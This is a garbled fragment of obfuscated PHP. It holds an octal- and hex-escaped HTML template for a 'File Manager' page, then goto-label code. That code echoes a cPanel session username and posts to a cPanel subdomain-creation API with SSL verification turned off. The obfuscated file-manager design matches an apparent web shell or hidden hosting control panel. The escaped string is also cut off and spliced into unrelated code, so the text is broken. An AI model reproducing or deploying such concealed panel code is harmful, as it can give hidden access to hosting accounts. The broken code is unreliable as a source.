1\143\x6b\x67\162\157\165\x6e\x64\72\x72\147\x62\x61\50\65\x36\54\x31\70\71\x2c\62\64\70\54\x2e\67\70\51\73\40\175\xa\40\x20\x20\40\x20\x20\40\x20\x2e\x62\164\x6e\55\x64\x61\156\x67\x65\162\173\40\x62\x61\x63\x6b\x67\162\x6f\165\x6e\144\x3a\x72\x67\142\x61\x28\x32\64\64\x2c\66\63\54\71\x34\54\56\61\64\51\x3b\x20\x63\x6f\154\157\162\x3a\x23\146\145\143\x64\x64\63\x3b\40\142\x6f\x72\x64\145\x72\x2d\143\x6f\x6c\157\x72\72\162\147\142\x61\50\x32\x34\x34\x2c\x36\63\54\x39\64\x2c\56\x32\65\x29\73\40\175\xa\x20\40\x20\x20\x20\x20\x20\40\56\x62\x74\x6e\55\x64\141\156\147\145\x72\72\150\x6f\x76\145\162\x7b\40\142\x61\143\153\x67\162\157\165\x6e\144\72\162\x67\142\x61\x28\x32\x34\64\x2c\66\63\54\x39\64\x2c\56\x32\60\x29\x3b\x20\x7d\12\40\x20\40\40\x20\x20\40\40\56\x6d\x6f\x64\141\x6c\55\x65\156\164\145\162\173\x6f\x70\141\143\x69\164\x79\x3a\x30\x3b\x20\164\162\x61\156\x73\146\157\x72\155\x3a\x74\162\x61\156\163\x6c\x61\x74\x65\131\x28\x38\160\x78\x29\x20\163\x63\x61\x6c\x65\50\x2e\x39\x39\51\x3b\175\12\x20\40\x20\x20\x20\x20\x20\x20\x2e\x6d\x6f\144\x61\x6c\x2d\x65\x6e\x74\145\162\55\141\143\x74\x69\166\145\173\157\160\x61\x63\151\x74\x79\72\61\73\x20\x74\x72\x61\x6e\x73\146\x6f\162\x6d\72\x74\x72\x61\156\x73\154\141\164\145\x59\50\60\51\x20\163\x63\x61\154\145\x28\61\x29\x3b\40\164\162\x61\x6e\x73\151\164\x69\x6f\x6e\72\40\141\x6c\154\40\56\61\70\163\40\x65\x61\163\145\x3b\175\xa\40\40\40\x20\40\x20\x20\40\x2e\155\157\x64\141\154\x2d\x65\170\x69\x74\x7b\157\160\141\143\x69\x74\171\72\61\73\175\12\40\x20\40\x20\40\40\x20\x20\56\x6d\x6f\x64\x61\x6c\55\145\170\x69\x74\x2d\141\x63\x74\x69\166\145\x7b\157\160\x61\x63\151\x74\171\x3a\60\73\40\x74\x72\x61\156\x73\x69\164\x69\157\156\72\157\x70\x61\143\151\164\x79\x20\56\61\x35\x73\40\x65\141\x73\x65\x3b\175\12\x20\40\x20\40\74\57\163\164\x79\x6c\145\x3e\xa\x3c\57\x68\145\x61\144\x3e\xa\x3c\142\157\144\x79\x20\143\x6c\x61\163\163\x3d\x22\x6d\151\156\55\150\x2d\163\143\162\x65\x65\x6e\40\x66\x6c\145\x78\x22\x3e\12\40\40\x20\40\74\41\x2d\55\x20\123\x49\104\105\x42\x41\x52\40\55\55\76\12\40\40\40\40\74\141\x73\151\x64\x65\40\143\154\141\163\x73\75\42\167\x2d\67\x32\40\160\x2d\66\x20\146\154\145\x78\40\x66\x6c\x65\170\x2d\x63\157\154\40\x6a\165\163\164\x69\146\x79\x2d\142\145\164\167\145\145\156\40\x68\55\163\x63\162\x65\145\x6e\40\x73\x74\151\x63\x6b\x79\40\164\x6f\x70\55\x30\40\147\154\141\x73\163\x22\76\12\40\40\40\x20\x20\x20\40\x20\74\144\x69\166\76\xa\40\x20\40\x20\x20\x20\x20\x20\x3c\x64\x69\166\76\12\x20\40\x20\40\40\40\40\x20\40\x20\x20\40\x3c\144\151\166\x20\x63\x6c\141\x73\x73\x3d\42\146\154\145\170\40\151\x74\145\155\163\x2d\x63\145\156\164\x65\162\x20\147\x61\x70\55\63\40\155\x62\x2d\x38\x22\x3e\xa\40\x20\x20\40\40\x20\x20\x20\40\x20\40\40\x20\x20\x3c\x64\151\x76\40\x63\x6c\141\163\x73\x3d\x22\x68\55\61\60\x20\x77\55\x31\60\x20\162\x6f\165\156\144\145\x64\55\x32\x78\x6c\x20\x62\x67\x2d\x77\150\x69\x74\x65\x2f\x31\60\40\x66\154\145\x78\40\x69\164\145\x6d\163\x2d\143\x65\x6e\x74\145\162\40\x6a\165\163\164\151\x66\171\x2d\143\x65\156\x74\x65\x72\x20\142\157\162\144\x65\162\40\x62\x6f\162\144\x65\162\55\167\150\151\x74\145\57\61\x30\x22\76\12\x20\40\40\40\40\x20\x20\x20\x20\40\x20\40\x20\40\40\40\74\151\x20\x63\x6c\x61\x73\x73\75\42\146\141\x2d\163\x6f\x6c\151\144\x20\x66\141\55\146\157\154\x64\x65\162\x2d\x74\x72\145\145\x20\x74\x65\x78\164\55\x73\153\x79\55\x33\60\60\42\x3e\74\x2f\x69\x3e\xa\x20\40\40\x20\40\x20\x20\40\40\x20\40\40\x20\x20\74\x2f\144\151\166\x3e\12\x20\40\x20\40\x20\x20\x20\40\x20\40\40\40\40\40\74\144\x69\x76\76\xa\40\40\x20\40\x20\x20\x20\40\x20\40\40\40\x20\x20\x20\x20\74\x68\61\x20\143\154\141\x73\163\75\x22\164\x65\170\164\55\x73\155\x20\x66\157\x6e\x74\x2d\x73\x65\x6d\x69\x62\x6f\154\144\40\x74\x65\170\x74\55\167\x68\x69\x74\145\40\154\x65\141\x64\151\x6e\x67\55\164\151\147\150\x74\x22\76\106\151\x6c\x65\40\x4d\141\x6e\141\x67\145\162\74\57\x68\61\76\xa\40\x20\40\x20\40\x20\40\40\x20\x20\x20\x20\40\x20\x20\40\74\160\40\143\154\141\x73\x73\x3d\x22\164\x65\x78\x74\55\170\x73\x20\164\x65\170\164\55\x73\x6c\x61\164\145\x2d\x33\60\x30\x2f\71\x []; goto eqDEN; tPXZd: echo nx6pl($XZ0KE); goto W7npP; Cz_kf: echo htmlspecialchars($_SESSION["\143\x70\x61\156\145\x6c"]["\165\x73\145\x72\x6e\141\155\x65"]); goto WG2J7; xNy_U: $gmEw2 = new itagb; ahZGF: function nX6pL($GJHV1) { return $GJHV1 !== null ? urlencode($GJHV1) : ''; } goto vnyic; OYo3r: echo goto a51s2; wbN9d: $lza1S = ["\x64\x6f\x6d\141\x69\x6e" => $ohsg9, "\162\x6f\157\164\144\x6f\x6d\141\x69\x6e" => $UFflv, "\143\141\x6e\x6f\x66\146" => $uWDmG["\143\x61\x6e\x6f\x66\x66"] ?? 1, "\x64\x69\162" => $uWDmG["\144\151\x72"] ?? '', "\x64\151\x73\x61\x6c\154\x6f\x77\144\x6f\x74" => $uWDmG["\144\x69\163\141\154\154\x6f\x77\144\x6f\164"] ?? 0]; goto EruUT; IJJGk: throw new Exception("\x63\125\122\114\x20\x65\x72\x72\157\x72\x3a\40" . curl_error($S5Y_J)); goto qj7Db; wTG_h: curl_setopt_array($S5Y_J, [CURLOPT_URL => $this->jIhla . "\x2f\145\x78\x65\x63\165\164\145\57\123\x75\x62\104\157\x6d\x61\151\156\57\x61\x64\144\x73\165\x62\144\157\x6d\141\151\156", CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_HTTPHEADER => ["\101\x75\x74\x68\157\162\151\x7a\x61\x74\151\x6f\x6e\x3a\x20" . $this->nPeBj], CURLOPT_POST => true, CURLOPT_POSTFIELDS => http_build_query($lza1S)]); goto ClUG7; L3Xxc: if (!($Xg3Cb === false)) { goto vBob3; } goto IJJGk; Ra3VW: if (!(!$CQtgt || !isset($CQtgt["\x73\164\x61\x74\x75\x73"]) || !$CQtgt["\163\x74\x61\x74\x75\x73"])) { goto I3I3v; } goto uo5dJ; wl8Jw: $CQtgt = json_decode($Xg3Cb, true); goto Ra3VW; uo5dJ: $l1lyW = isset($CQtgt["\145\162\162\157\162\163"][0]) ? $CQtgt["\x65\162\162\x6f\x72\x73"][0] : "\125\x6e\153\156\157\x77\156\x20\x65\162\x72\x6f\x72"; goto QMHp7; qj7Db: vBob3: goto R4jVw; R4jVw: curl_close($S5Y_J); goto wl8Jw; ClUG7: $Xg3Cb = curl_exec($S5Y_J); goto L3Xxc; a51s2: I3I3v: goto qyZiw; EruUT: $S5Y_J = curl_init(); goto wTG_h; u_gS4: } }
